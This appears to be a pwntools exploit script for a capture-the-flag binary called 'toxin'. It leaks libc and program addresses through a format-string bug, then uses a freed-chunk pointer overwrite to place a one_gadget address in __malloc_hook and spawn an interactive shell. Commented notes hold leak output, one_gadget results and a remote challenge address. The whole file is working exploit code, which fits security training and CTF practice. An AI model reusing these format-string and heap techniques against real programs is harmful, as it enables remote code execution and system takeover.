from pwn import *

context.log_level = 'debug'

def detect():
	for i in range(20):
		io.recvuntil('>')
		io.sendline('4')
		io.recvuntil('Enter search term:')
		io.sendline('%'+str(i+1)+'$p')
		buf = io.recvline().strip().split(' ')[0]
		print str(i+1)+' : '+buf

# 1. Add toxin => Allocate chunk
def add_toxin(length,index,data):
	io.sendline("1")
	io.recv()
	io.sendline(str(length))
	io.recv()
	io.sendline(str(index))
	io.recv()
	io.sendline(data)
	io.recv()
# 2. Drink toxin => Free chunk
def drink_toxin(index):
	io.sendline("3")
	io.recv()
	io.sendline(str(index))
	io.recv()
# 3. Edit toxin => Rewrite the fd of the freed chunk
def edit_toxin(index,data):
	io.sendline("2")
	io.recv()
	io.sendline(str(index))
	io.recv()
	io.sendline(data)
	io.recv()

#ip, port = '159.65.16.219',30003
#io = remote(ip, port)
io = process('./toxin')

elf = ELF('./toxin')
libc = ELF('./lib/libc.so.6')

#detect()

'''
echo 0 > /proc/sys/kernel/randomize_va_space

1 : 0x7fffffffe26a
2 : 0x10
3 : 0x7ffff7af4081
4 : 0x13
5 : (nil)
6 : 0x3ffffe290
7 : 0xa7024372550d0
8 : 0x7fffffffe290
9 : 0x555555555284
10 : 0x7fffffffe370
11 : 0x400000000
12 : 0x5555555556d0
13 : 0x7ffff7a05b97
14 : 0x1
15 : 0x7fffffffe378
16 : 0x10000c000
17 : 0x5555555551b5
18 : (nil)
19 : 0xe618444d10ca1f98
20 : 0x5555555550d0


pwndbg> disassemble 0x7ffff7a05b97
Dump of assembler code for function __libc_start_main:

>>> hex(elf.sym['main'])
'0x11b5'

'''

io.recvuntil('>')
io.sendline('4')
io.recvuntil('Enter search term:')
io.sendline('%13$p')
libc_start_main = int(io.recvline().strip().split(' ')[0],16)
libc.address = libc_start_main - libc.sym['__libc_start_main']
#print hex(libc.address)

io.recvuntil('>')
io.sendline('4')
io.recvuntil('Enter search term:')
io.sendline('%17$p')
elf_main = int(io.recvline().strip().split(' ')[0],16)
elf.address = elf_main - elf.sym['main']
#print hex(elf.address)

'''
add_toxin(0x70,0,"A"*8)
drink_toxin(0)
edit_toxin(0,p64(0x55555555803d)) # toxinfreed - 19
add_toxin(100,1,"C"*8)
add_toxin(100,2,"D"*8 + "E"*8 + "F"*8 + "G" *8 ) # Overwriting

one_gadget ./lib/libc.so.6
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

add_toxin(0x70,0,"A"*8)
drink_toxin(0)
edit_toxin(0,p64(elf.symbols["toxinfreed"] -0x13))

add_toxin(100,1,"C"*8)
add_toxin(100,2, "\x00"*35 + p64(libc.symbols['__malloc_hook']) + p64(0)*3)
edit_toxin(0,p64(libc.address + 0x10a38c))

### Call __malloc_hook and get the shell ---
io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline("1")
# ---
io.interactive()
